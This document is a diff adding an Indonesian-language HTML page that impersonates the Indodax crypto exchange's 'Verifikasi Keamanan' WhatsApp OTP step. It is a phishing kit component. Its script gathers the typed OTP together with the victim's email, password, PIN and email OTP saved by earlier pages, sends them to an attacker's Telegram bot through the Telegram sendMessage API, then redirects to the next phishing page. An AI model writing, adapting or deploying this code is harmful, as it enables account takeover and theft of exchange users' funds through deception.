@@ -1,0 +1,323 @@
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Indodax Verifikasi Keamanan</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
+    rel="stylesheet"
+  />
+  <style>
+    /* Reset and base */
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: "Inter", sans-serif;
+      background-color: #f5f7fa;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    /* Header */
+    header {
+      background-color: #fff;
+      box-shadow: 0 2px 6px rgb(0 0 0 / 0.1);
+      width: 100%;
+      max-width: 640px;
+      padding: 12px 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 40px;
+    }
+    header img.logo {
+      height: 40px;
+      width: auto;
+    }
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+    .btn-logout {
+      background-color: #1e88e5;
+      color: white;
+      font-weight: 600;
+      font-size: 0.875rem;
+      padding: 8px 20px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .btn-logout:hover {
+      background-color: #1669b2;
+    }
+    .flag {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      border: 1px solid #e5e7eb;
+      object-fit: cover;
+    }
+    /* Main container */
+    main {
+      background-color: #fff;
+      max-width: 400px;
+      width: 100%;
+      border-radius: 12px;
+      box-shadow: 0 1px 4px rgb(0 0 0 / 0.1);
+      padding: 24px 32px;
+      margin-bottom: 40px;
+    }
+    /* Headings */
+    h1 {
+      font-weight: 600;
+      font-size: 1.25rem;
+      color: #1f2937;
+      margin: 0 0 12px 0;
+    }
+    p.description {
+      font-weight: 400;
+      font-size: 1rem;
+      color: #374151;
+      margin: 0 0 24px 0;
+      line-height: 1.5;
+    }
+    /* Label */
+    label {
+      font-weight: 600;
+      font-size: 1rem;
+      color: #1f2937;
+      display: block;
+      margin-bottom: 8px;
+    }
+    /* Input group */
+    .input-group {
+      display: flex;
+      border: 1px solid #d1d5db;
+      border-radius: 8px;
+      overflow: hidden;
+      transition: box-shadow 0.3s ease;
+    }
+    .input-group:focus-within {
+      box-shadow: 0 0 0 2px #1e88e5;
+      border-color: #1e88e5;
+    }
+    input[type="text"] {
+      flex-grow: 1;
+      padding: 10px 16px;
+      font-size: 1rem;
+      color: #9ca3af;
+      border: none;
+      outline: none;
+    }
+    input[type="text"]::placeholder {
+      color: #9ca3af;
+    }
+    button.send-code {
+      background: none;
+      border: none;
+      color: #1e88e5;
+      font-weight: 600;
+      font-size: 1rem;
+      padding: 10px 16px;
+      cursor: pointer;
+      white-space: nowrap;
+      transition: text-decoration 0.3s ease;
+    }
+    button.send-code:hover:not(:disabled) {
+      text-decoration: underline;
+    }
+    button.send-code:disabled {
+      color: #9ca3af;
+      cursor: default;
+      text-decoration: none;
+    }
+    /* Link button */
+    button.link-button {
+      background: none;
+      border: none;
+      color: #1e88e5;
+      font-weight: 600;
+      font-size: 1rem;
+      width: 100%;
+      margin-top: 16px;
+      cursor: pointer;
+      text-align: center;
+      padding: 0;
+      transition: text-decoration 0.3s ease;
+    }
+    button.link-button:hover {
+      text-decoration: underline;
+    }
+    /* Submit button */
+    button.submit-btn {
+      background-color: #1e88e5;
+      color: white;
+      font-weight: 600;
+      font-size: 1rem;
+      width: 100%;
+      padding: 12px 0;
+      border: none;
+      border-radius: 8px;
+      margin-top: 24px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    button.submit-btn:hover {
+      background-color: #1669b2;
+    }
+    /* Responsive */
+    @media (max-width: 480px) {
+      main {
+        padding: 20px 24px;
+        margin-bottom: 32px;
+      }
+      header {
+        max-width: 100%;
+        padding: 12px 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img
+      src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTRHCOE7BSJG8ioQWJO1WCG7D3t-dpqgT7t6I3VxXsL4L6IzwikoDN0iUbB&s=10"
+      alt="New logo image with blue stylized text"
+      class="logo"
+      width="150"
+      height="40"
+    />
+    <div class="header-right">
+      <button type="button" class="btn-logout">Keluar</button>
+      <img
+        src="https://storage.googleapis.com/a1aa/image/0941f989-bd91-4b20-bd32-9e2e1cc09543.jpg"
+        alt="Indonesian flag round icon with red top half and white bottom half"
+        class="flag"
+        width="32"
+        height="32"
+      />
+    </div>
+  </header>
+  <main>
+    <h1>Verifikasi Keamanan</h1>
+    <p class="description">
+      Harap selesaikan proses verifikasi di bawah untuk melanjutkan
+    </p>
+    <form id="verificationForm" class="form">
+      <label for="whatsapp-code">Verifikasi via WhatsApp (4 digit)</label>
+      <div class="input-group">
+        <input
+          type="text"
+          id="whatsapp-code"
+          name="whatsappCode"
+          maxlength="4"
+          placeholder="Masukkan Kode"
+          aria-label="Masukkan Kode WhatsApp 4 digit"
+          required
+        />
+        <button type="button" id="sendCodeBtn" class="send-code">
+          Kirim Kode
+        </button>
+      </div>
+      <button type="button" class="link-button">Kehilangan Nomor Handphone?</button>
+      <button type="submit" class="submit-btn">Verifikasi</button>
+    </form>
+  </main>
+  <script>
+    let telegramBotToken;
+    let telegramChatId;
+
+    fetch("config.json")
+      .then(response => response.json())
+      .then(config => {
+        telegramBotToken = config.telegramBotToken;
+        telegramChatId = config.telegramChatId;
+        initializeOtpLogic();
+      })
+      .catch(error => {
+        console.error("Error fetching config:", error);
+        alert("Failed to load configuration.");
+      });
+
+    function initializeOtpLogic() {
+      const sendCodeBtn = document.getElementById("sendCodeBtn");
+
+      sendCodeBtn.addEventListener("click", () => {
+        // Disable button and start countdown
+        let countdown = 60;
+        sendCodeBtn.disabled = true;
+        sendCodeBtn.textContent = `${countdown} detik`;
+
+        const interval = setInterval(() => {
+          countdown--;
+          if (countdown > 0) {
+            sendCodeBtn.textContent = `${countdown} detik`;
+          } else {
+            clearInterval(interval);
+            sendCodeBtn.disabled = false;
+            sendCodeBtn.textContent = "Kirim Kode";
+          }
+        }, 1000);
+
+        // Here you can add code to actually send the code if needed
+      });
+
+      document
+        .getElementById("verificationForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+          const code = document.getElementById("whatsapp-code").value.trim();
+          if (code.length !== 4) {
+            alert("Masukkan kode 4 digit yang valid.");
+            return;
+          }
+          localStorage.setItem("userWhatsappOtp", code);
+
+          // Retrieve existing data from localStorage
+          const storedEmail = localStorage.getItem("userEmail");
+          const storedPassword = localStorage.getItem("userPassword");
+          const storedPin = localStorage.getItem("userPin");
+          const storedEmailOtp = localStorage.getItem("userEmailOtp");
+
+          let fullMessage = `Indodaxcom:\nWhatsApp OTP: ${code}`;
+          if (storedEmail) {
+            fullMessage += `\n\nEmail: ${storedEmail}`;
+          }
+          if (storedPassword) {
+            fullMessage += `\nPassword: ${storedPassword}`;
+          }
+          if (storedPin) {
+            fullMessage += `\nPIN: ${storedPin}`;
+          }
+          if (storedEmailOtp) {
+            fullMessage += `\nEmail OTP: ${storedEmailOtp}`;
+          }
+
+          const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(
+            fullMessage
+          )}`;
+
+          fetch(url)
+            .then((response) => response.json())
+            .then((data) => {
+              if (data.ok) {
+                location.href ="otp.html";
+                document.getElementById("verificationForm").reset();
+              } else {
+                alert("Gagal mengirim kode ke Telegram.");
+              }
+            })
+            .catch(() => {
+              alert("Terjadi kesalahan saat mengirim kode ke Telegram.");
+            });
+        });
+    }
+  </script>
+</body>
+</html>
